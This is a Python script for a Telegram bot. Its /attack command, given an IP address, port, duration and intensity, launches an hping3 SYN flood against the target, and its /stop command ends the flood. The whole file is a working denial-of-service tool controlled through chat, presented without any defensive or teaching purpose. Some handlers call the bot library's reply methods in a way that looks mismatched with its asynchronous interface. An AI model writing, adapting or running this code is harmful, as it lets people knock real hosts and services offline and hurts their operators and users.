import subprocess
import threading
import time
import logging
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext, filters

# Configure logging
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Replace with your bot token
TOKEN = "YOUR_BOT_TOKEN"

# Replace with your authorized Telegram user IDs
AUTHORIZED_USERS = [123456789, 987654321]  # Example user IDs

attack_process = None
attack_thread = None

def validate_user(update: Update) -> bool:
    """Check if the user is authorized."""
    user_id = update.effective_user.id
    if user_id not in AUTHORIZED_USERS:
        update.message.reply_text("Unauthorized access.")
        logger.warning(f"Unauthorized access attempt by user ID: {user_id}")
        return False
    return True

def start_attack(ip: str, port: int, duration: int, intensity: int = 1000000) -> bool:
    """Start the attack process."""
    global attack_process, attack_thread
    if attack_process is None or attack_process.poll() is not None:
        try:
            attack_process = subprocess.Popen(
                [
                    "hping3", "-S", "-p", str(port),
                    "-c", str(int(duration * intensity / 60)),
                    "-d", "120", "-w", "64", ip
                ],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            attack_thread = threading.Thread(target=monitor_attack, args=(attack_process, duration))
            attack_thread.start()
            return True
        except Exception as e:
            logger.error(f"Failed to start attack: {e}")
            return False
    return False

def monitor_attack(process: subprocess.Popen, duration: int):
    """Monitor the attack process and stop after the duration."""
    start_time = time.time()
    while process.poll() is None and time.time() - start_time < duration * 60:
        time.sleep(1)
    if process.poll() is None:
        process.terminate()

def stop_attack() -> bool:
    """Stop the running attack process."""
    global attack_process, attack_thread
    if attack_process and attack_process.poll() is None:
        attack_process.terminate()
        attack_process = None
        if attack_thread and attack_thread.is_alive():
            attack_thread.join()
        return True
    return False

def attack_command(update: Update, context: CallbackContext) -> None:
    """Handle the /attack command."""
    if not validate_user(update):
        return

    args = context.args
    if len(args) < 3 or len(args) > 4:
        update.message.reply_text("Usage: /attack <ip> <port> <duration_in_minutes> [intensity]")
        return

    ip = args[0]
    try:
        port = int(args[1])
        duration = int(args[2])
        intensity = int(args[3]) if len(args) == 4 else 1000000

        if not (1 <= port <= 65535):
            raise ValueError("Invalid port number.")
        if duration <= 0:
            raise ValueError("Duration must be positive.")
        if intensity <= 0:
            raise ValueError("Intensity must be positive.")
    except ValueError as e:
        update.message.reply_text(f"Error: {e}")
        return

    if start_attack(ip, port, duration, intensity):
        update.message.reply_text(f"Attack started on {ip}:{port} for {duration} minutes with intensity {intensity}.")
        logger.info(f"Attack started by user ID {update.effective_user.id} on {ip}:{port} for {duration} minutes.")
    else:
        update.message.reply_text("An attack is already running.")

def stop_command(update: Update, context: CallbackContext) -> None:
    """Handle the /stop command."""
    if not validate_user(update):
        return

    if stop_attack():
        update.message.reply_text("Attack stopped.")
        logger.info(f"Attack stopped by user ID {update.effective_user.id}.")
    else:
        update.message.reply_text("No attack is currently running.")

def error_handler(update: Update, context: CallbackContext) -> None:
    """Log and handle errors."""
    logger.error(f"Update {update} caused error {context.error}")
    if update.effective_message:
        update.effective_message.reply_text("An unexpected error occurred. Please try again later.")

def main():
    """Start the bot."""
    application = Application.builder().token(TOKEN).build()

    application.add_handler(CommandHandler("attack", attack_command, filters=filters.ChatType.PRIVATE))
    application.add_handler(CommandHandler("stop", stop_command, filters=filters.ChatType.PRIVATE))
    application.add_error_handler(error_handler)

    logger.info("Bot started.")
    application.run_polling()

if __name__ == "__main__":
    main()